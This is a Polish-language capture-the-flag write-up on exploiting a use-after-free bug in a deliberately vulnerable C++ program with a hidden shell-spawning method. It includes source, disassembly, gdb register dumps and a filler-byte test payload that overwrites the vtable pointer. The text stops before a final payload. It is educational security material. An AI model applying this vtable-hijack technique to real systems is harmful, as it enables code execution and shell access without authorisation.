## uaf - 8 pt ##

Flaga: `flag`

Kod źródłowy **uaf.c**:

```cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```
* Output z checksec:
```
uaf@ubuntu:~$ checksec uaf
[*] '/home/uaf/uaf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
* Program na początku alokuje pamięć na (tworzy) dwa obiekty: `man` i `woman`
* Za pomocą opcji w menu, możemy wykonać operacje niezbędne do zmiany przebiegu wykonania kodu:
  * `1. use` - wypisanie na konsolę informacji o obiekcie
  * `2. after` - pobranie danych z `arg[1]` i `arg[2]` i wrzucenie ich do pamięci
  * `3. free` - zwolnienie obiektów utworzonych na początku pracy
* Ogólny schemat exploitacji podatności UAF zamyka się w tym: należy zwolnić prawidłowy obiekt i w jego miejsce "podsunąć" zmodyfikowany (o takim samym rozmiarze), tak aby uzyskać wykonanie kodu
* Warto zwrócić uwagę na rozmiar alokacji pamięci dla obiektów, który w obydwu przypadkach wynosi `0x18 (24)` - przyda się to w następnych krokach

```asm
   0x0000000000400ef7 <+51>:	lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:	mov    edi,0x18
   0x0000000000400f00 <+60>:	call   0x400d90 <_Znwm@plt>
```
* Warunkiem pomyślnego uzyskania flagi jest poznanie struktury pamięci obiektu, obsługiwanego przez opcję `1. use`. Do tego przyda się zdisasemblowany kod obsługujący tego brancha:
```asm
   0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:	add    rax,0x8
   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:	mov    rdi,rax
   0x0000000000400fe2 <+286>:	call   rdx
   0x0000000000400fe4 <+288>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400fe8 <+292>:	mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:	add    rax,0x8
   0x0000000000400fef <+299>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400ff6 <+306>:	mov    rdi,rax
   0x0000000000400ff9 <+309>:	call   rdx
   0x0000000000400ffb <+311>:	jmp    0x4010a9 <main+485>
```
* Instrukcje w powyższym listingu są prawie identyczne, różnice następują jedynie w odwołaniach do adresów pamięci: `[rbp-0x38]` vs `[rbp-0x30]`
* Stawiając breakpointa w adresie z początku listingu i "przechodząc" wykonanie, krok po kroku możemy zauważyć, że w pewnym momencie w rejestrach `RAX` i `RBX` pojawia się interesujący adres - metody `give_shell()`:
```
 [----------------------------------registers-----------------------------------]
RAX: 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RBX: 0x614ca0 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RCX: 0x0 
RDX: 0x7fffffffdb48 --> 0x1 
RSI: 0x0 
RDI: 0x7ffff7dd6140 --> 0x0 
RBP: 0x7fffffffdb60 --> 0x4013b0 (<__libc_csu_init>:	mov    QWORD PTR [rsp-0x28],rbp)
RSP: 0x7fffffffdb00 --> 0x7fffffffdc48 --> 0x7fffffffe062 ("uaf")
RIP: 0x400fd4 (<main+272>:	add    rax,0x8)
R8 : 0x7ffff78398e0 --> 0xfbad2288 
R9 : 0x7ffff783b790 --> 0x0 
R10: 0x7ffff7fba740 (0x00007ffff7fba740)
R11: 0x7ffff7b5b930 (<_ZNKSt7num_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE14_M_extract_intIjEES3_S3_S3_RSt8ios_baseRSt12_Ios_IostateRT_>:	push   r15)
R12: 0x7fffffffdb20 --> 0x614c88 --> 0x6c6c694a ('Jill')
R13: 0x7fffffffdc40 --> 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400fc8 <main+260>:	jmp    0x4010a9 <main+485>
   0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
=> 0x400fd4 <main+272>:	add    rax,0x8
   0x400fd8 <main+276>:	mov    rdx,QWORD PTR [rax]
   0x400fdb <main+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fdf <main+283>:	mov    rdi,rax
   0x400fe2 <main+286>:	call   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdb00 --> 0x7fffffffdc48 --> 0x7fffffffe062 ("uaf")
0008| 0x7fffffffdb08 --> 0x30000ffff 
0016| 0x7fffffffdb10 --> 0x614c38 --> 0x6b63614a ('Jack')
0024| 0x7fffffffdb18 --> 0x401177 (<_GLOBAL__sub_I_main+19>:	pop    rbp)
0032| 0x7fffffffdb20 --> 0x614c88 --> 0x6c6c694a ('Jill')
0040| 0x7fffffffdb28 --> 0x614c50 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
0048| 0x7fffffffdb30 --> 0x614ca0 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
0056| 0x7fffffffdb38 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400fd4 in main ()
```
* Kolejna instrukcja: `0x400fd4 <main+272>:	add    rax,0x8`, do adresu `give_shell()` dodaje 8, co powoduje zmianę wskaźnika z `give_shell()` na metodę `Man::introduce()`
* Wiedząc mniej więcej jak wygląda struktura obiektu w pamięci (różnica 8 pomiędzy wskaźnikami do metod) możemy eksperymentalnie sprawdzić co się stanie w momencie załadowania śmieci do pamięci, za pomocą opcji menu `2. after`. Dla mnie najprościej jest stworzyć taki plik za pomocą pythona: `python -c 'print ("\x41"*6 + "\x42"*6 + "\x43"*6 "\x44"*6)' > uaf_test`. Jeżeli wymagamy aby payload miał unikalne bajty można skorzystać z funkcji `cyclic()` pochodzącej z `pwntools`.
* Uruchamiamy binarkę: `./uaf 24 uaf_test` np. w gdb i sprawdzamy co się dzieje w poprzednim breakpoincie (oczywiście po **DWUKROTNYM** usunięciu obiektów i załadowaniu pliku do pamięci). Dlaczego dwukrotnym? Bo na początku zadania są tworzone dwa obiekty i również potrzebujemy odworzyć dwa obiekty (plik ma strukturę tylko jednego):
```
gdb-peda$ r 24 uaf_test 
Starting program: uaf 24 uaf_test
1. use
2. after
3. free
3
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1

 [----------------------------------registers-----------------------------------]
RAX: 0x4242414141414141 ('AAAAAABB')
RBX: 0x614ca0 ("AAAAAABBBBBBCCCCCCDDDDDD\021\004")
RCX: 0x0 
RDX: 0x7fffffffdb48 --> 0x1 
RSI: 0x0 
RDI: 0x7ffff7dd6140 --> 0x0 
RBP: 0x7fffffffdb60 --> 0x4013b0 (<__libc_csu_init>:	mov    QWORD PTR [rsp-0x28],rbp)
RSP: 0x7fffffffdb00 --> 0x7fffffffdc48 --> 0x7fffffffe064 ("uaf")
RIP: 0x400fd4 (<main+272>:	add    rax,0x8)
R8 : 0x7ffff78398e0 --> 0xfbad2288 
R9 : 0x7ffff783b790 --> 0x0 
R10: 0x7ffff7fba740 (0x00007ffff7fba740)
R11: 0x246 
R12: 0x7fffffffdb20 --> 0x614c88 --> 0x6c6c694a ('Jill')
R13: 0x7fffffffdc40 --> 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400fc8 <main+260>:	jmp    0x4010a9 <main+485>
   0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
=> 0x400fd4 <main+272>:	add    rax,0x8
   0x400fd8 <main+276>:	mov    rdx,QWORD PTR [rax]
   0x400fdb <main+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fdf <main+283>:	mov    rdi,rax
   0x400fe2 <main+286>:	call   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdb00 --> 0x7fffffffdc48 --> 0x7fffffffe064 ("uaf")
0008| 0x7fffffffdb08 --> 0x30000ffff 
0016| 0x7fffffffdb10 --> 0x614c38 --> 0x6b63614a ('Jack')
0024| 0x7fffffffdb18 --> 0x401177 (<_GLOBAL__sub_I_main+19>:	pop    rbp)
0032| 0x7fffffffdb20 --> 0x614c88 --> 0x6c6c694a ('Jill')
0040| 0x7fffffffdb28 --> 0x614c50 ("AAAAAABBBBBBCCCCCCDDDDDD1")
0048| 0x7fffffffdb30 --> 0x614ca0 ("AAAAAABBBBBBCCCCCCDDDDDD\021\004")
0056| 0x7fffffffdb38 --> 0x18 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400fd4 in main ()

```
